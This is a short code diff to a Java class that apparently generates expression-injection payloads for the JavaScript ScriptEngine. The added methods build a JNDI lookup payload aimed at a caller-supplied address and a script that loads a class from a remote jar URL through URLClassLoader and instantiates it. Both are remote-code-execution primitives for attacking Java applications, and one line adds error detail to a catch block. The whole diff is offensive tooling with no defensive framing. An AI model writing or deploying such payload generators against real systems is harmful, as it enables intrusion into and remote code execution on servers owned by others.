@@ -69,13 +69,19 @@ public class ScriptEngineManagerExpr implements IExpr {
             };
         } catch (Exception ex) {
             return new String[]{
-                    "class文件异常"
+                    "class文件异常",
+                    Utils.getErrDetail(ex)
             };
         }
     }
 
     @Override
     public String[] genJNDI(String jndiAddress) {
-        return null;
+        return new String[]{out("new javax.naming.InitialContext().lookup('" + jndiAddress + "')")};
+    }
+
+    @Override
+    public String[] genLoadJar(String url, String className) {
+        return new String[]{out("var urls = new Array(); urls[0]=new java.net.URL(\"" + url + "\");new java.net.URLClassLoader(urls).loadClass(\"" + className + "\").newInstance()")};
     }
 }
